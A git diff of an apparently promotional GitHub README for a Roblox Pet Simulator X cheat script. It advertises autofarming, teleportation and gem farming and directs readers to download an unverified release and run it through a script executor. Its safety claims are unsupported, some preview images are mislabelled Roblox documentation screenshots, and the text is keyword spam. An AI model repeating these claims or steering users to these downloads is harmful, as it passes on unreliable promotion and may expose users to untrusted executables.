@@ -1,72 +1,95 @@
-# pet-simulator-x-autofarm-ultimate-2025
+# 🐾 Pet Simulator X Script - Autofarm, Teleport, and Gem Farming
 
-Dominate Pet Simulator X with this powerful Roblox Lua script offering auto-farming, teleportation, gem collection, and more. Works with the latest game updates.
+Welcome to the **download** repository! This project provides a robust script for **Pet Simulator X** on Roblox, designed to enhance your gaming experience with features like autofarming, teleportation, and gem farming. Whether you're a casual player or a seasoned pro, this script can help you maximize your gameplay.
 
-[![Download PSX Script](https://img.shields.io/badge/Download-PSX--Script-blueviolet)](https://pet-simulator-x-v-4-34.github.io/.github)
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Script Features](#script-features)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features
+
+- **Autofarm**: Automatically collect pets and resources.
+- **Teleportation**: Instantly travel to various locations within the game.
+- **Gem Farming**: Efficiently gather gems to enhance your gameplay.
+- **User-Friendly**: Simple setup and easy to use.
+- **Regular Updates**: Keep up with the latest game changes.
+
+## Installation
+
+To get started, download the latest version of the script from the [Releases](https://github.com/natalia54ab/download/releases) section. Follow these steps:
+
+1. Visit the [Releases](https://github.com/natalia54ab/download/releases) page.
+2. Download the appropriate script file.
+3. Execute the script within your Roblox environment.
+
+## Usage
+
+Once you have downloaded the script, follow these steps to use it:
+
+1. Open Roblox and launch **Pet Simulator X**.
+2. Run the script using a script executor.
+3. Enjoy features like autofarming, teleportation, and gem farming.
+
+## Script Features
+
+### Autofarm
+
+The autofarm feature allows you to collect pets and resources automatically. This means you can focus on enjoying the game while the script handles the repetitive tasks.
+
+### Teleportation
+
+Easily move to different areas in **Pet Simulator X**. This feature saves time and helps you access rare pets and resources quickly.
+
+### Gem Farming
+
+Maximize your gem collection with our efficient gem farming feature. The script targets gem locations, ensuring you gather as many as possible in the shortest time.
+
+## Contributing
+
+We welcome contributions to improve the script. If you have suggestions or improvements, please fork the repository and submit a pull request. 
+
+### How to Contribute
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use and modify the script as you wish, but please credit the original authors.
+
+## Contact
+
+For any questions or support, please reach out via GitHub. You can also check the [Releases](https://github.com/natalia54ab/download/releases) section for updates.
 
 ---
 
-### 🎯 Key Features
+![Pet Simulator X](https://example.com/pet-simulator-x-image.png)
 
-- ✅ Auto-Farm (Coins, Diamonds, Presents)
-- ✅ Teleport to Any Area Instantly
-- ✅ Auto-Collect Lootbags & Boosts
-- ✅ Anti-AFK + Auto-Rank Up
-- ✅ Easy GUI Interface
-- ✅ Supports All Devices (PC, Mobile, Executor-friendly)
+### Topics
 
----
-
-### 🛡 Why Choose It?
-
-- Updated frequently to match PSX patches  
-- Clean & safe execution (no token grabbers)  
-- Fully customizable farming options  
-- Built-in lag reduction & auto-pet equip
-
----
-
-### 🧪 Usage Examples
-
-- 💰 Farm Fantasy Coins while AFK overnight  
-- 🌀 Teleport to Tech World in one click  
-- 🐾 Instantly collect loot around the map  
-- 🧼 Auto-clean laggy pet drops or duplicates  
-- 🧠 Use GUI toggles to enable/disable features
+- pet-simulator
+- pet-simulator-2-hack
+- pet-simulator-hack
+- pet-simulator-script
+- pet-simulator-scrtipt-2025
+- pet-simulator-x
+- pet-simulator-x-script
+- pet-simulator-x-script-pastebin
+- roblox-pet-simulator-hack
+- roblox-pet-simulator-pets
+- roblox-pet-simulator-script
+- roblox-pet-simulator-x-script
+- roblox-pet-simulator-x-script-pastebin
+- roblox-pet-simulator-x-script-pastebin-2025
 
 ---
 
-### 🏆 Benefits
-
-- Grow your pet inventory faster than ever  
-- Rank up passively and collect more diamonds  
-- Unlock zones with minimal grinding  
-- Safe for alt accounts and smurf farming
-
----
-
-### 🔐 Safety & Privacy
-
-- No backdoors, stealers, or logging  
-- Code readable and open-source  
-- Works on Synapse X, Fluxus, KRNL, and more  
-- No key system or locked scripts
-
----
-
-### 🖼 Preview
-
-![Main GUI & Script Hub](https://repository-images.githubusercontent.com/429560297/cce4d5ce-786f-4f0c-b5c2-5c49d929973e)  
-*Custom interface for toggling farm, TP, and gems*
-
-![AutoFarm in Action](https://prod.docsiteassets.roblox.com/assets/studio/properties/Script-RunContext.png)  
-*Bot farming diamonds & coins on auto-pilot*
-
-![Teleport GUI](https://prod.docsiteassets.roblox.com/assets/getting-started/Scripts-1.png)  
-*Jumping between biomes instantly with GUI controls*
-
----
-
-### 🔍 SEO Keywords
-
-pet simulator x script, psx roblox hack, auto farm pet simulator x, roblox psx gui, psx teleport tool, lootbag script roblox, roblox pet sim script 2025, psx diamond farm
+Feel free to explore the repository, and don't forget to check out the [Releases](https://github.com/natalia54ab/download/releases) for the latest updates! Happy gaming!
